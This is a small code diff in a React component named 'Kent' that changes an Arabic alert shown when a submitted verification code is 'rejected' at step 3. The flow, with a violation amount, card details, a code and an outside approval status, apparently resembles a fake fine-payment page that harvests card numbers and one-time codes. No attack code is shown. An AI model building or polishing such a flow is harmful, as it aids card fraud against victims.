@@ -411,7 +411,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
             } else if (step === 3 && data.status === "rejected") {
               // If we're on step 3 and status is rejected, show alert
               setLoading(false)
-              alert("تم رفض الرمز, ادخال معلومات البطاقة بشكل صحيح ")
+              alert("تم رفض الرمز,الرجاء ادخال الرمز بشكل صحيح ")
               setStep(2)
             }
           }
